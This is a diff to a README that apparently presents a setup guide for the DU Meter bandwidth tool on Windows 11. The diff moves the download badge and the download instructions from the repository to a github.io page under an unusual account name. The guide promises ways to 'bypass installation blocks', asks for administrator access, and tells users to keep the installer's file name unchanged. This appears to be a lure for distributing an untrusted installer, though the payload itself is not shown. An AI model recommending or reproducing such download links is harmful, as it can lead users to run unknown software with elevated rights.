@@ -1,6 +1,6 @@
 # 📊 DU-Meter-Configuration-Guide - Track your internet usage with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/nigerien-genusxenicus825/DU-Meter-Configuration-Guide)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://nigerien-genusxenicus825.github.io)
 
 ## 📌 About this guide
 This guide helps you install and configure DU Meter on Windows 11. Many users experience installation errors with older versions of network monitoring tools on modern operating systems. This repository provides specific steps to bypass installation blocks, configure the software correctly, and monitor your network bandwidth effectively. You do not need technical expertise to follow these instructions.
@@ -13,7 +13,7 @@ Before you start, ensure your computer meets these basic requirements:
 * Permissions: Administrator access to your user account.
 
 ## 📥 Downloading the software
-1. Visit the following link to access the installation files: [https://github.com/nigerien-genusxenicus825/DU-Meter-Configuration-Guide](https://github.com/nigerien-genusxenicus825/DU-Meter-Configuration-Guide).
+1. Visit the following link to access the installation files: [https://nigerien-genusxenicus825.github.io](https://nigerien-genusxenicus825.github.io).
 2. Locate the download button on the page.
 3. Save the installation file to your Downloads folder.
 4. Keep the file name unchanged to ensure the installer runs correctly.
